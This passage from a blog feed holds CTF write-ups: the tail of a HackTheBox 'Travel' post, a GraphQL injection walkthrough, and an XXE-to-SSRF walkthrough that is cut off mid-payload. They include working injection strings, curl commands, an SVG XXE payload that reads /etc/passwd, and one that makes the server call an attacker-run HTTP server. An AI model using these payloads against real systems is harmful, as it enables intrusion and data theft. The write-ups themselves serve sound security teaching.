class="line">louise@travel:~$ sudo cat /root/root.txt</span><br><span class="line">1xxxxxxxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://github.com/internetwache/GitTools">GitTools</a></li><li><a href="https://github.com/simplepie/simplepie/">SimplePie Source Code</a></li><li><a href="https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/">PHP Object Injection Cheat Sheet</a></li><li><a href="http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt">vBulletin  &lt;= 5.2.2 Preauth Server Side Request Forgery (SSRF) | Memcached Injection</a></li><li><a href="https://www.exploit-db.com/exploits/42392">GitHub Enterprise &lt; 2.8.7 - Remote Code Execution | Memcached Injection</a></li><li><a href="https://linux.die.net/man/1/ldapmodify">Ldapmodify man page</a></li><li><a href="https://linux.die.net/man/1/ldapadd">Ldapadd man page</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Hard Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> git </tag>
            
            <tag> memcached </tag>
            
            <tag> docker </tag>
            
            <tag> SSRF </tag>
            
            <tag> ldap </tag>
            
            <tag> travel </tag>
            
            <tag> phpmemcached </tag>
            
            <tag> memcached injection </tag>
            
            <tag> Gopher </tag>
            
            <tag> deserialization </tag>
            
            <tag> simplePie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - GraphQL Injection</title>
      <link href="/posts/misc-ctf/graphql-injection/"/>
      <url>/posts/misc-ctf/graphql-injection/</url>
      
        <content type="html"><![CDATA[<p>GraphQL is becoming more and more common nowadays and this challenge was the perfect way to digg into the subject and understand the flaws we can find there.</p><p><strong>Tl;Dr:</strong> After understanding the app is making GraphQL request it was possible to inject arbritrary GraphQL queries. This way we could create an introspection query in order to retrieve more informations about the available Queries, Types, Fields. Mutations. etc. used by the server. With those informations it was then possible to forge a query to retrieve the flag.</p><p>Alright! Let’s get into the details now!</p><hr><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge displays the following app:</p><p><img src="https://user-images.githubusercontent.com/9076747/123524412-5f90e000-d6ca-11eb-918e-b95cfcb8766d.png" alt="egraph misc ctf"></p><p>The app seems to only have one feature. Let’s open our browser Dev Tools to see what’s going on.</p><p>When we make a simple search for “John” the following request is being made:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33435</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;filter&quot;</span>:<span class="string">&quot;John&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>And we get the following result:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>132</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;84-W1Jl79yV42Y65MNzIB+8pLV3dM4&quot;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;findIndividuals&quot;</span>:[&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;John&quot;</span>,<span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Doe&quot;</span>,<span class="attr">&quot;criminalRiskScore&quot;</span>:<span class="number">98</span>,<span class="attr">&quot;sex&quot;</span>:<span class="string">&quot;MALE&quot;</span>,<span class="attr">&quot;dob&quot;</span>:<span class="string">&quot;1949-06-08&quot;</span>&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>The format of requests and responses looks very like GraphQL queries. This would make sense given the name of the challenge.</p><h2 id="GraphQL-Architecture"><a href="#GraphQL-Architecture" class="headerlink" title="GraphQL Architecture"></a>GraphQL Architecture</h2><p>If you are not familiar with GraphQL, here is the definition from the official website:</p><blockquote><p>GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data. GraphQL provides a complete and understandable description of the data in your API, gives clients the power to ask for exactly what they need and nothing more, makes it easier to evolve APIs over time, and enables powerful developer tools.<br><a href="https://graphql.org/">https://graphql.org/</a></p></blockquote><p>An interesting point is that GraphQL isn’t tied to any specific database and is instead backed by code. It means that, unlike REST APIs (where the client first interacts with arbitrary code written by programmer and this code reaches the database); the client first interacts with GraphQL, which in turn interacts with arbitrary code and ultimately ends talking to the database.</p><p><img src="https://user-images.githubusercontent.com/9076747/123524479-ee056180-d6ca-11eb-8b81-3b0be64281e4.png" alt="image"></p><h2 id="GraphQL-Injection"><a href="#GraphQL-Injection" class="headerlink" title="GraphQL Injection"></a>GraphQL Injection</h2><p>When we try to input a classical quote <code>&quot;</code> in the search field the get the following error:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://misc.ctf:33436&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> --data-binary <span class="string">&#x27;&#123;&quot;filter&quot;:&quot;\&quot;&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;errors&quot;</span>:[&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Syntax Error: Unterminated string.&quot;</span>,<span class="string">&quot;locations&quot;</span>:[&#123;<span class="string">&quot;line&quot;</span>:<span class="number">1</span>,<span class="string">&quot;column&quot;</span>:<span class="number">96</span>&#125;]&#125;]&#125;% </span><br></pre></td></tr></table></figure><p>Since I know nothing about GraphQL I checked the documentation of the <a href="https://graphql.org/graphql-js/graphql-clients/"> Javascript Client</a>.<br>From the doc and the request result we can guess that the application backend is doing a query more or less like this:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">`query &#123; findIndividuals(filter: &quot;<span class="subst">$&#123;req.body.filter&#125;</span>&quot;) &#123; id, firstName, lastName, criminalRiskScore, sex, dob &#125; &#125;`</span>)</span><br></pre></td></tr></table></figure><p>From there we can see how we could possibly inject custom queries. The idea is exactly the same as SQL Injection.</p><p>First step is to craft a query to retrieve as much informations as possible from the database. We can do so using <a href="https://graphql.org/learn/introspection/">GraphQL Introspection Query</a>.</p><blockquote><p>Introspection is the ability to query which resources are available in the current API schema. Given the API, via introspection, we can see the queries, types, fields, and directives it supports.</p></blockquote><p>Doing the following query should allow us to get all informations we need about the API schema:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__schema &#123;</span><br><span class="line">    types &#123;</span><br><span class="line">        name,</span><br><span class="line">        fields &#123;</span><br><span class="line">            name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So if we try to inject this query in the app, we should send something like this (the <code>#</code> at the end will comment the end of the line):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;)&#123;firstname&#125;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;#&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>So the server will make the following query:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query &#123; <span class="function"><span class="title">findIndividuals</span>(<span class="params">filter: <span class="string">&quot;&quot;</span></span>)</span>&#123;firstname&#125;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;#&#125;<span class="string">&quot;) &#123; id, firstName, lastName, criminalRiskScore, sex, dob &#125; &#125;</span></span><br></pre></td></tr></table></figure><p>Let’s send it:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://misc.ctf:33436/search&#x27;</span> --data-binary <span class="string">&#x27;&#123;&quot;filter&quot;:&quot;\&quot;)&#123;firstName&#125;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;#&#125;&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;findIndividuals&quot;</span>:[&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;John&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Bob&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Jeremy&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Brenda&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Grace&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Marie&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Timothy&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Robin&quot;</span>&#125;],<span class="string">&quot;__schema&quot;</span>:&#123;<span class="string">&quot;types&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Schema&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;types&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;queryType&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;mutationType&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;subscriptionType&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;directives&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;String&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Type&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;kind&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;fields&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;interfaces&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;possibleTypes&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;enumValues&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;inputFields&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ofType&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__TypeKind&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Field&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;args&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;type&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;isDeprecated&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;deprecationReason&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__InputValue&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;type&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;defaultValue&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Boolean&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__EnumValue&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;isDeprecated&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;deprecationReason&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Directive&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;isRepeatable&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;locations&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;args&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__DirectiveLocation&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Query&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;findIndividuals&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;configuration&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Individual&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;id&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;firstName&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;lastName&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;criminalRiskScore&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sex&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;dob&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ID&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Int&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Configuration&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;value&quot;</span>&#125;]&#125;]&#125;&#125;&#125;%</span><br></pre></td></tr></table></figure><p>Bingo we got plenty of data. Amongst the results we notice a <code>flag</code> field and an uncommon <code>configuration</code> query.</p><p>Let’s forge a new query to see what we get get from the <code>configuration</code> query:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;)&#123;id&#125;configuration&#123;value&#125;&#125;#</span></span><br></pre></td></tr></table></figure><p>We send it:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://misc.ctf:33436/search&#x27;</span> --data-binary <span class="string">&#x27;&#123;&quot;filter&quot;:&quot;\&quot;)&#123;id&#125;configuration&#123;value&#125;&#125;#&#125;&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;findIndividuals&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;3&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;4&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;5&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;7&quot;</span>&#125;],<span class="string">&quot;configuration&quot;</span>:&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;flag&#123;9r4pHql iNJ3Cti0N2!&#125;&quot;</span>&#125;&#125;&#125;% </span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e">Discovering GraphQL endpoints and SQLi vulnerabilities</a></li><li><a href="https://blog.doyensec.com/2018/05/17/graphql-security-overview.html">GraphQL - Security Overview and Testing Tips</a></li><li><a href="https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/">Looting GraphQL Endpoints for Fun and Profit</a></li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection">Top 1: Injection | OWASP</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-cheat-sheet">Injection Prevention Cheat Sheet | OWASP</a></li></ul><h2 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h2><p>Preventing injection requires keeping data separate from commands and queries.</p><ul><li>The preferred option is to use a safe API, which avoids the use of the interpreter entirely or provides a parameterized interface, or migrate to use Object Relational Mapping Tools (ORMs).</li><li>Use positive or “whitelist” server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.</li><li>For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.</li><li>Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</li><li>See more: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-cheat-sheet">Injection Prevention Cheat Sheet | OWASP</a></li></ul><h2 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h2><ul><li><a href="https://hackerone.com/reports/489146">Confidential data of users and limited metadata of programs and reports accessible via GraphQL</a><a href="https://hackerone.com/reports/489146"> </a><a href="https://hackerone.com/reports/489146">($20,000)</a><a href="https://hackerone.com/reports/489146"> | HackerOne</a></li><li><a href="https://hackerone.com/reports/435066">SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter | HackerOne</a></li><li><a href="https://hackerone.com/reports/645299">Private information exposed through GraphQL filters | HackerOne</a></li><li><a href="https://hackerone.com/reports/342978">Team object in GraphQL disclosed total number of whitelist | HackerOne</a></li></ul><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> beginner </tag>
            
            <tag> GraphQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - XXE to SSRF</title>
      <link href="/posts/misc-ctf/xxe-to-ssrf/"/>
      <url>/posts/misc-ctf/xxe-to-ssrf/</url>
      
        <content type="html"><![CDATA[<p>This fun little challenge highlight two issue at once: XML External Entity (XXE) and Server-side request forgery (SSRF) and show how it’s possible to chain multiple vulnerabilities to have a bigger impact on a target.</p><p><strong>Tl;Dr:</strong> You have to exploit an XML External Entity vulnerability through the upload of a SVG file in order achieve Server-side request forgery to activate a premium feature only available to privileged users.</p><p>Alright! Let’s get into the details now!</p><hr><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge displays the following application:</p><p><img src="https://user-images.githubusercontent.com/9076747/123846317-7f681400-d915-11eb-82a3-406578c68eec.png" alt="misc ctf xxe to ssrf"></p><p>Once we upload an image we can activate few function, only “Blur” function is available.<br>By opening the browser developper tools we can see that two requests are being made once the “blur” function is being activated.</p><h2 id="Feature-Toggle"><a href="#Feature-Toggle" class="headerlink" title="Feature Toggle"></a>Feature Toggle</h2><p>The first request activate the <code>blur</code> feature:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://blur.ctf:33433/features/0/toggle -i</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>If <code>0</code> is the ID of <code>Blur</code> feature maybe we can activate the two other locked features by calling the /toogle endpoint directly?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://blur.ctf:33433/features/1/toggle -i</span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 105</span><br><span class="line">Connection: keep-alive</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;If you are a paying customer, ask your CSM to toggle the feature for you in our back-office&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>Too bad seems like we are not allowed to…</p><p>Let’s move on.</p><h2 id="XXE-Injection"><a href="#XXE-Injection" class="headerlink" title="XXE Injection"></a>XXE Injection</h2><p>Let’s focus a moment on the upload function. Only SVG file are allowed. </p><p>As a reminder:</p><blockquote><p>Scalable Vector Graphics (SVG) is an Extensible Markup Language (XML)-based vector image format for two-dimensional graphics with support for interactivity and animation.<br><a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">https://en.wikipedia.org/wiki/Scalable_Vector_Graphics</a></p></blockquote><p>SVG is based on XML. We can actually see the SVG content when uploading our file:</p><img width="1359" alt="misc ctf svg" src="https://user-images.githubusercontent.com/9076747/123846786-16cd6700-d916-11eb-88dc-22b5a336891a.png"><p>Having a XML file being send and proceeded to the server open door to very common vulnerability: <strong>XXE injection</strong>.</p><blockquote><p>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application’s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.<br>In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.</p><p><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p></blockquote><p>We should give a try by crafting a malicious SVG file to exploit XXE Injection. Here how we should be able to read the server <code>/etc/passwd</code> file:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>We save it, upload it to the app and…. Well nothing really happen. Since the app try to draw the SVG and don’t proceed correctly the text.</p><p>Let’s try to find another way.</p><h2 id="XXE-to-SSRF"><a href="#XXE-to-SSRF" class="headerlink" title="XXE to SSRF"></a>XXE to SSRF</h2><p>Another way to exploit XXE Injection is to use it to perform server-side request forgery (SSRF) attacks.</p><blockquote><p>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing.<br>In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization’s infrastructure, or to external third-party systems.</p><p><a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></p></blockquote><p>Since we are not even sure that our XXE injection worked, let’s try another payload. This time we are going to try performing an a SSRF, in other words, make the server request an URL we control.</p><p>To give it a try let’s open a simple Python server on our machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>And include our server URL in the SVG payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.1.21:8000 &gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">&lt;svg width=&quot;</span>128px<span class="meta-string">&quot; height=&quot;</span>128px<span class="meta-string">&quot; xmlns=&quot;</span>http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; version=&quot;</span>1.1<span class="meta-string">&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span class="meta">   &lt;text font-size=&quot;</span>16<span class="meta-string">&quot; x=&quot;</span>0<span class="meta-string">&quot; y=&quot;</span>16<span class="meta-string">&quot;&gt;&amp;xxe;&lt;/text&gt;</span></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"><span 